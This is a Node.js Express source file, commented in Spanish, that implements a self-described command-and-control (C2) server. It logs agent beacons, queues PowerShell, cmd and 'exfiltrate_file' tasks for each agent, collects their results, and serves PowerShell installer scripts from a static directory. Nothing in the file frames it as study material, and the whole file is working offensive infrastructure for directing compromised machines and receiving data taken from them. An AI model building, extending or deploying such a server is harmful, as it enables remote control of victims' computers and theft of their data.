import dotenv from 'dotenv';
import express from 'express';
import morgan from 'morgan';
import fs from 'fs';
import path from 'path';
// import url from 'url'; // No se usa actualmente con Express req.query

// Cargar variables de entorno desde .env solo si el archivo existe (para desarrollo local)
// En Render, las variables de entorno se establecen a través del dashboard o render.yaml
const envPath = path.join(path.resolve(), '.env'); // path.resolve() necesita 'path'
if (fs.existsSync(envPath)) { // fs.existsSync necesita 'fs'
  dotenv.config({ path: envPath });
  console.log('Archivo .env local cargado.');
}

const app = express();
const PORT = process.env.PORT || 3005; // Render seteará process.env.PORT

// --- Middlewares ---
app.use(morgan('dev')); // Logging HTTP
app.use(express.json()); // Para parsear cuerpos de solicitud JSON (necesario para /sendresult)
// --------------------

// --- Configuración de Logging ---
const logsDir = path.join(path.resolve(), 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}
const beaconLogStream = fs.createWriteStream(path.join(logsDir, 'beacons.log'), { flags: 'a' });
const commandLogStream = fs.createWriteStream(path.join(logsDir, 'commands.log'), { flags: 'a' });
const taskResultsLogStream = fs.createWriteStream(path.join(logsDir, 'task_results.log'), { flags: 'a' });

function logToFile(stream, message) {
    const timestamp = new Date().toISOString();
    stream.write(`[${timestamp}] ${message}\n`);
    console.log(`Logged to file: ${message}`); // También loguear a consola para Render
}
// -----------------------------

// --- Servir Archivos Estáticos ---
const publicDir = path.join(path.resolve(), 'public');
app.use('/files', express.static(publicDir)); // Accedido vía /files/core_services_mvp1.ps1
// ------------------------------

// --- Almacenamiento de Tareas en Memoria (Simple) ---
let tasks_pending = {}; // Ejemplo: { 'agent123': [{ task_id: 't1', command: 'whoami', type: 'powershell' }] }
let nextTaskId = 1;
// --------------------------------------------------

// --- Rutas del C2 ---
// Endpoint de Beacon (MVP1)
app.get('/api/updates', (req, res) => {
    const agentId = req.query.uid || 'UnknownAgent';
    const phase = req.query.phase || 'UnknownPhase';
    const message = `Beacon recibido de: ${agentId} (Fase: ${phase})`;
    
    console.log(`[+] ${message}`);
    logToFile(beaconLogStream, message);
    
    // Opcional: Crear una cola de tareas para un nuevo agente si no existe
    if (!tasks_pending[agentId]) {
        tasks_pending[agentId] = [];
        logToFile(commandLogStream, `Nueva cola de tareas creada para el agente: ${agentId}`);
    }

    res.status(200).send('Beacon received by C2 server (MVP1 - Express)\n');
});

// Endpoint para que el agente solicite tareas (MVP2)
app.get('/api/tasks/:agentId/get', (req, res) => {
    const agentId = req.params.agentId;
    logToFile(commandLogStream, `Agente ${agentId} solicitando tarea.`);

    if (tasks_pending[agentId] && tasks_pending[agentId].length > 0) {
        const task = tasks_pending[agentId].shift(); // Obtener y remover la primera tarea
        logToFile(commandLogStream, `Enviando tarea ID ${task.task_id} (${task.command}) al agente ${agentId}.`);
        res.status(200).json(task);
    } else {
        logToFile(commandLogStream, `No hay tareas pendientes para el agente ${agentId}. Enviando comando de dormir.`);
        res.status(200).json({ task_id: `sleep_${Date.now()}`, command: 'sleep', type: 'internal' }); // O simplemente 204 No Content
    }
});

// Endpoint para que el agente envíe resultados de tareas (MVP2)
app.post('/api/results/:agentId/send', (req, res) => {
    const agentId = req.params.agentId;
    const result = req.body; // Asume que el resultado viene en el cuerpo como JSON

    if (!result || !result.task_id) {
        logToFile(taskResultsLogStream, `Resultado inválido recibido del agente ${agentId}: cuerpo vacío o sin task_id.`);
        return res.status(400).send('Resultado inválido: se requiere task_id.');
    }

    const message = `Resultado recibido del agente ${agentId} para la tarea ${result.task_id}: ${JSON.stringify(result.output).substring(0,200)}...`;
    console.log(`[+] ${message}`);
    logToFile(taskResultsLogStream, message);
    
    // Aquí podrías procesar más el resultado, guardarlo en DB, etc.
    res.status(200).send('Resultado recibido por el C2.');
});

// Endpoint para añadir una tarea (para pruebas, podrías protegerlo más adelante)
app.post('/api/tasks/:agentId/add', (req, res) => {
    const agentId = req.params.agentId;
    const { command, type = 'powershell', payload_b64 } = req.body; // payload_b64 es opcional

    if (!command) {
        return res.status(400).send('Se requiere el campo "command".');
    }

    const newTask = {
        task_id: `task_${nextTaskId++}`,
        command: command,
        type: type, // 'powershell', 'cmd', 'exfiltrate_file', etc.
        payload_b64: payload_b64 // Para comandos que necesitan un payload o ruta de archivo
    };

    if (!tasks_pending[agentId]) {
        tasks_pending[agentId] = [];
    }
    tasks_pending[agentId].push(newTask);
    const message = `Nueva tarea añadida para ${agentId}: ID ${newTask.task_id} (${newTask.command})`;
    logToFile(commandLogStream, message);
    res.status(201).json({ message: "Tarea añadida", task: newTask });
});


// Health Check Endpoint para Render
app.get('/api/health', (req, res) => {
    res.status(200).send('OK');
});
// -----------------

// --- Manejo de Errores Básico ---
app.use((req, res) => {
    res.status(404).send("Endpoint no encontrado en C2 Express\n");
});

app.use((err, req, res, _next) => {
    console.error("Error en C2 Express:", err.stack);
    logToFile(commandLogStream, `SERVER_ERROR: ${err.message} - Stack: ${err.stack}`);
    res.status(500).send('Error interno del servidor C2\n');
});
// ---------------------------

const server = app.listen(PORT, () => {
    console.log(`Servidor C2 (Express) escuchando en el puerto ${PORT}`);
    console.log(`  -> Endpoint de beacon: GET /api/updates?uid=AGENT_ID&phase=mvpX`);
    console.log(`  -> Endpoint de solicitud de tareas: GET /api/tasks/:agentId/get`);
    console.log(`  -> Endpoint de envío de resultados: POST /api/results/:agentId/send`);
    console.log(`  -> Endpoint de adición de tareas (test): POST /api/tasks/:agentId/add`);
    console.log(`  -> Archivos estáticos servidos desde /files (ej. /files/installer_mvp1.ps1)`);
    logToFile(commandLogStream, `Servidor C2 iniciado en puerto ${PORT}.`);
});

// Manejo de cierre del servidor
process.on('SIGTERM', () => {
    logToFile(commandLogStream, 'Servidor C2 cerrándose (SIGTERM)...');
    server.close(() => {
        logToFile(commandLogStream, 'Servidor C2 cerrado.');
        process.exit(0);
    });
});
